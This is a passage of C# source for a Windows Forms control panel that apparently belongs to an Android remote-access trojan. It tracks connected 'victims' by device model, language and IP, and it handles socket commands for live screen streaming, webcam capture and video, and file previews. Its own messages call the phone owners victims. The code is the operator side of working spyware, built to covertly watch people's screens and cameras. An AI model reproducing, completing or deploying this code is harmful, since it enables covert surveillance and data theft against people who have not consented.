                return;
            await Task.Run(async () =>
            {
                try
                {
                    if (_applicationExitRequested)
                        return;
                    if (oursocket != null)
                    {
                        sendToSocket("REQCLIENTLIST", "[VERI][0x09]");
                        //sendToSocket("REQCLIENTLIST", "[VERI]" + "Client id goes here" + "[VERI][0x09]");
                    }
                }
                catch (Exception ex)
                {
                    if (!_applicationExitRequested)
                        await Task.Delay(2000);
                }
            });
        }
        private void Data_Coming_From_Our_Socket(string data)
        {
            string[] _parts_ = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
            foreach (string str in _parts_)
            {
                string[] separator = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                try
                {             
                    switch (separator[0])
                    {
                        case "RECCLIENTLIST":
                            // MessageBox.Show(separator[1]);
                            Console.WriteLine("Recieved client list");
                            //Console.WriteLine(separator[1]);
                            ModifyClientListCheck(separator);
                            break;
                        case "TEST":
                            break;

                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error: {ex}");
                }
            }
        }
        private async void ModifyClientListCheck(string[] arrstr)
        {
            await Task.Run(async () =>
            {
                try
                {
                    Invoke((MethodInvoker)delegate
                    {
                        // deal with clients in listview

                        StringBuilder sb = new StringBuilder();

                        if (arrstr != null && arrstr.Length > 1)
                        {
                            List<Victim> victimlist = JsonConvert.DeserializeObject<List<Victim>>(arrstr[1]);

                            foreach (Victim vic in victimlist)
                            {
                                string clientid = string.Empty;
                                foreach (ListViewItem lvi in listView1.Items)
                                {
                                    if (lvi.Text == vic.id)
                                    {
                                        clientid = vic.id;
                                    }
                                }

                                if (clientid == string.Empty)
                                {
                                    bool clientfound = false;
                                    foreach (Victim victim in victim_list)
                                    {
                                        //victimcopy = victim;
                                        if (victim.id == vic.id)
                                        {
                                            clientfound = true;
                                        }
                                    }
                                    if (!clientfound)
                                    {
                                        Add_Client(vic.soket ?? oursocket, vic.id, vic.pcname, vic.language, vic.model, vic.version);
                                        listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + vic.id);
                                    }
                                }
                            }

                            victim_list = victimlist;

                            foreach (ListViewItem lvi in listView1.Items)
                            {
                                bool clientfound = false;

                                foreach (Victim victim in victim_list)
                                {
                                    if (lvi.Text == victim.id)
                                    {
                                        clientfound = true;
                                    }
                                }

                                if (!clientfound)
                                {
                                    listView1.Items.Remove(lvi);
                                }
                            }

                            /*

                            for (int i = 1; i < arrstr.Length; i++)
                            {
                                string clientid = string.Empty;
                                sb.Append("[VERI]" + arrstr[i]);
                                if (listView1.Items.Count > 0)
                                {
                                    foreach (ListViewItem lvi in listView1.Items)
                                    {
                                        if (lvi.Text == arrstr[i])
                                        {
                                            clientid = arrstr[i];
                                        }
                                    }
                                    //clientid = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == arrstr[i]).DefaultIfEmpty().First().SubItems[0].Text;
                                }
                                if (clientid == string.Empty)
                                {
                                    bool clientfound = false;
                                    foreach (Victim victim in victim_list)
                                    {
                                        //victimcopy = victim;
                                        if (victim.id == arrstr[i])
                                        {
                                            clientfound = true;
                                        }
                                    }
                                    if (!clientfound)
                                    {
                                        //list.Add(victimcopy);
                                        Add_Client(oursocket, arrstr[i], "soon", "soon", "soon", "22/22");
                                        listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + arrstr[i]);
                                    }
                                }
                            }
                        }

                        Console.WriteLine(sb.ToString());

                        if (arrstr.Length > 2)
                        {
                            List<Victim> newlist = new List<Victim>();
                            foreach (Victim victim in victim_list)
                            {
                                for (int i = 1; i < arrstr.Length; i++)
                                {
                                    if (victim.id == arrstr[i])
                                    {
                                        newlist.Add(victim);
                                    }
                                }
                            }
                            victim_list = newlist;
                        }

                            foreach (ListViewItem lvi in listView1.Items)
                            {
                            bool clientfound = false;

                            foreach (Victim victim in victim_list)
                            {
                                if (lvi.Text == victim.id)
                                {
                                    clientfound = true;
                                }
                            }

                            if (!clientfound)
                            {
                                listView1.Items.Remove(lvi);
                            }

                            }
                            */

                            onlinecountlbl.Text = "Online: " + listView1.Items.Count.ToString();
                            listBox1.EndUpdate();
                        }
                    });
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            });
        }
        private void clientcounttimer_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            RequestClientsList();
        }















        public static int topOf = 0;
        public async void Add_Client(Socket socket, string victim_id, string pc_name,
         string country_language, string manufacturer_model, string android_ver)
        {
            //socettte.NoDelay = true;
            //socettte.ReceiveBufferSize = int.MaxValue; socettte.SendBufferSize = int.MaxValue;
            victim_list.Add(new Victim(socket, victim_id, pc_name, country_language, manufacturer_model, android_ver));
            ListViewItem lvi = new ListViewItem(victim_id);
            lvi.SubItems.Add(pc_name);
            lvi.SubItems.Add(socket != null ? socket.RemoteEndPoint?.ToString() : "-");
            lvi.SubItems.Add(country_language);
            lvi.SubItems.Add(manufacturer_model.ToUpper());
            lvi.SubItems.Add(android_ver);
        
            listView1.Items.Add(lvi);

            onlinecountlbl.Text = "Online: " + listView1.Items.Count.ToString();
            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + (socket != null ? socket.Handle.ToString() : "-") +
                        " in list. => " + pc_name + "/" + (socket?.RemoteEndPoint?.ToString() ?? "-"));
            await Task.Delay(1);
            topOf += 125;

        }

        private void Remove_Client(string clientid)
        {
            MessageBox.Show("Boo");
            foreach (ListViewItem itemRow in this.listView1.Items)
            {
                if (itemRow.Text == clientid)
                {
                    
                    this.listView1.Items.Remove(itemRow);
                }
            }




                    onlinecountlbl.Text = "Online: " + listView1.Items.Count.ToString();
        }
        public void Client_Accept(IAsyncResult ar)
        {
            try
            {
                Socket sock = oursocket.EndAccept(ar);
                if (_applicationExitRequested)
                {
                    TryShutdownSocket(sock);
                    return;
                }
                infoAl(sock);
                if (!_applicationExitRequested && oursocket != null)
                    oursocket.BeginAccept(new AsyncCallback(Client_Accept), null);
            }
            catch (Exception) { }
        }
        public FİleManager FindFileManagerById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<FİleManager>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public void DataInvoke(Socket soket2, string data)
        {
            string[] ayir = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
            foreach (string str in ayir)
            {
                string[] s = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                try
                {
                    switch (s[0])
                    {
                        case "IP":
                            Invoke((MethodInvoker)delegate
                            {
                                Add_Client(soket2, soket2.Handle.ToString(), s[1], s[2], s[3], s[4]);
                                Console.WriteLine("connected");
                            });
                            break;

                        case "LIVESCREEN":
                            var canliekran = FindLiveScreenById(soket2.Handle.ToString());
                            if (canliekran != null)
                            {
                                canliekran.pictureBox1.Image = ((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                            }
                            else
                            {
                                CommandSend("SCREENLIVECLOSE", "[VERI][0x09]", soket2);
                            }
                            break;
                        case "NOTSTART":
                            var canliekran_ = FindLiveScreenById(soket2.Handle.ToString());
                            if (canliekran_ != null)
                            {
                                MessageBox.Show(canliekran_, "Victim has ignored the screen share dialog.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                canliekran_.Close();
                            }
                            break;
                        case "OLCULER":
                            Invoke((MethodInvoker)delegate
                            {
                                if (s[1].Contains("Kameraya"))
                                {
                                    MessageBox.Show(this, s[1] + "\nThis error causes when camera is used by victim.", "Can't access to Camera", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                                else
                                {
                                    if (FİndCameraById(soket2.Handle.ToString()) == null)
                                    {
                                        Kamera msj = new Kamera(soket2, soket2.Handle.ToString());
                                        msj.Text = "Camera Manager - " + FindVictim(soket2.Handle.ToString());
                                        msj.Show();
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).comboBox1.Items.Clear();
                                    FİndCameraById(soket2.Handle.ToString()).comboBox2.Items.Clear();
                                    string[] front = s[1].Split('>');
                                    string[] _split = front[1].Split('<');
                                    FİndCameraById(soket2.Handle.ToString()).max = int.Parse(s[2].Split('}')[1]);
                                    FİndCameraById(soket2.Handle.ToString()).comboBox1.Items.AddRange(_split);
                                    _split = front[0].Split('<');
                                    FİndCameraById(soket2.Handle.ToString()).comboBox2.Items.AddRange(_split);
                                    var found = FİndCameraById(soket2.Handle.ToString());
                                    found.zoomSupport = Convert.ToBoolean(s[2].Split('}')[0]);

                                    string[] presize = s[3].Split('<'); found.comboBox4.Items.AddRange(presize);
                                    string[] cams = s[4].Split('!'); for (int p = 0; p < cams.Length; p++)
                                    {
                                        cams[p] = cams[p].Replace("0", "Back: 0").Replace("1", "Front: 1");
                                    }
                                    found.comboBox6.Items.AddRange(cams);
                                    found.comboBox6.SelectedIndex = 0;
                                    foreach (string str_ in found.comboBox1.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox1.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (string str_ in found.comboBox2.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox2.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (object str_ in found.comboBox4.Items)
                                    {
                                        if (str_.ToString().Contains("352"))
                                        {
                                            found.comboBox4.SelectedItem = str_;
                                        }
                                    }
                                    found.comboBox3.SelectedItem = "%70";
                                }
                            });
                            break;
                        case "PREVIEW":
                            if (FindFileManagerById(soket2.Handle.ToString()) != null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Image =
                                       (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1]));
                                    FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Visible = true;
                                });
                            }
                            break;
                        case "VID":
                            var shortcam = FİndCameraById(soket2.Handle.ToString());
                            try
                            {
                                if (shortcam != null)
                                {
                                    shortcam.pictureBox2.Image = RotateImage((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                                    shortcam.label10.Text = "Fps: " + shortcam.CalculateFrameRate().ToString();
                                }
                            }
                            catch (Exception ex)
                            {
                                if (shortcam != null)
                                {
                                    FİndCameraById(soket2.Handle.ToString()).Text = ex.Message;
                                }
                            }
                            break;
                        case "WEBCAM":
                            if (FİndCameraById(soket2.Handle.ToString()) != null)
                            {
                                try
                                {

                                    FİndCameraById(soket2.Handle.ToString()).label2.Text = "Captured.";
                                    byte[] resim = Convert.FromBase64String(s[1]);
                                    using (MemoryStream ms = new MemoryStream(resim))
                                    {
                                        FİndCameraById(soket2.Handle.ToString()).pictureBox1.Image = Image.FromStream(ms);
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                    ((System.Windows.Forms.Control)FİndCameraById(soket2.Handle.ToString()).tabPage2).Enabled = true;
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show(FİndCameraById(soket2.Handle.ToString()), ex.Message, "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    FİndCameraById(soket2.Handle.ToString()).Text = "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                }
                            }
                            break;
                        case "CAMNOT":
                            var fnd = FİndCameraById(soket2.Handle.ToString());
                            if (fnd != null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    if (s[1] == "")
                                    {
                                        FİndCameraById(soket2.Handle.ToString()).label2.Text = "Couldn't capture.";
                                    }
                                    FİndCameraById(soket2.Handle.ToString()).label1.Visible = true;
                                    FİndCameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                    ((System.Windows.Forms.Control)fnd.tabPage1).Enabled = true; ///<--------- Changed from (Control)
                                    ((System.Windows.Forms.Control)fnd.tabPage2).Enabled = true;
                                    fnd.enabled = false;
                                    fnd.button4.Text = "Start";
                                    fnd.button4.Enabled = true;
                                });
                                if (s[1] != "" && s[1] != "vid")
                                {
                                    MessageBox.Show(fnd, s[1], "Warning - Camera Preview Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                            }
                            break;

                    }
                }
                catch (Exception) { }
            }
        }
        public string krbnIsminiBul(string handle)
        {
            string isim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[1].Text;
            string ip = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[2].Text;
            return isim + "@" + ip;
        }
        public string FindVictim(string handle)
        {
                string isim = listView1.SelectedItems[0].SubItems[1].Text;
                string ip = listView1.SelectedItems[0].SubItems[2].Text;
            /*
            string isim = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[1].Text;
            string ip = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == handle).First().SubItems[2].Text;
            return isim + "@" + ip;
            */

            return isim + "@" + ip;

        }
        public livescreen FindLiveScreenById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<livescreen>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Kamera FİndCameraById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Kamera>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public static async void CommandSend(string tag, string mesaj, Socket client)
        {
            try
            {
                using (NetworkStream ns = new NetworkStream(client))
                {
                    byte[] cmd = Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + "<EOF>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }
            }
            catch (Exception) { }
        }

        public static RotateFlipType rotateFlip = RotateFlipType.Rotate270FlipX;
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);
            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(rotateFlip);
            return bmp;
        }
        private void liveScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                bool apiLevelOk = true;
                try
                {
                    var v = listView1.SelectedItems[0].SubItems[5].Text.Split('/');
                    if (v.Length > 1) apiLevelOk = int.Parse(v[1]) >= 21;
                }
                catch { }
                if (apiLevelOk)
                {
                    foreach (Victim victim in victim_list)
                    {
                        if (victim.id == listView1.SelectedItems[0].Text)
                        {
                            livescreen lvsc = new livescreen(victim.id, victim.pcname ?? victim.id);
                            lvsc.Text = "Live Screen - " + (victim.pcname ?? victim.id);
                            lvsc.Show();
                        }
                    }
                }
                else
                {
                    MessageBox.Show("Target device's API Level must be 21 or higher.\nCheck link\nhttps://developer.android.com/reference/android/media/projection/MediaProjection");
                    System.Diagnostics.Process.Start("https://developer.android.com/reference/android/media/projection/MediaProjection");
                }
            }
        }
        private void liveStreamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1) return;
            foreach (Victim victim in victim_list)
            {
                if (victim.id == listView1.SelectedItems[0].Text)
                {
                    var lvsc = new livescreen(victim.id, victim.pcname ?? victim.id);
                    lvsc.Text = "Live Stream - " + (victim.pcname ?? victim.id);
                    lvsc.Show();
                    return;
                }
            }
        }
        private void SnapPictureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count != 1) return;
            foreach (Victim victim in victim_list)
            {
                if (victim.id == listView1.SelectedItems[0].Text)
                {
                    var kam = new Kamera(victim.id, victim.pcname ?? victim.id);
                    kam.Show();
                    return;
                }
            }
        }







        //misc idk..
        private async void materialButton1_Click(object sender, EventArgs e)
        {
            Console.WriteLine(loginCB.SelectedIndex.ToString());
        }

        private void listenswitch_CheckedChanged(object sender, EventArgs e)
        {
            if (listenswitch.Checked)
                Connect_Setup();
            else
                StopClientListPollingTimer();
        }
















        //infoal backup

        /*
         * 
         * 
         * 

                public async void infoAl(Socket sckInf)
        {
            if (!sckInf.Connected)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " couldn't connect."); return;
            }
            if (sckInf.Poll(-1, SelectMode.SelectRead) && sckInf.Available <= 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " ghost connection: Poll");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            if (sckInf.Available == 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " the socket is not ready: [ghost connection]");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            NetworkStream networkStream = new NetworkStream(sckInf);

            if (!networkStream.CanRead)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                    " networkstream couldn't read."); sckInf.Dispose(); return;
            }

            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + sckInf.Handle.ToString() +
                    " networkstream have started.");

            StringBuilder sb = new StringBuilder();
            int thisRead = 0;
            int blockSize = 2048;
            byte[] dataByte = new byte[blockSize];
            while (true)
            {
                try
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    sb.Append(Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    while (sb.ToString().Trim().Contains($"<EOF{PASSWORD}>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                        DataInvoke(sckInf, veri.Replace($"<EOF{PASSWORD}>", ""));
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                    }
                }
                catch (Exception)
                {
                    break;
                }
            }
        }

        */


















    }
}
    
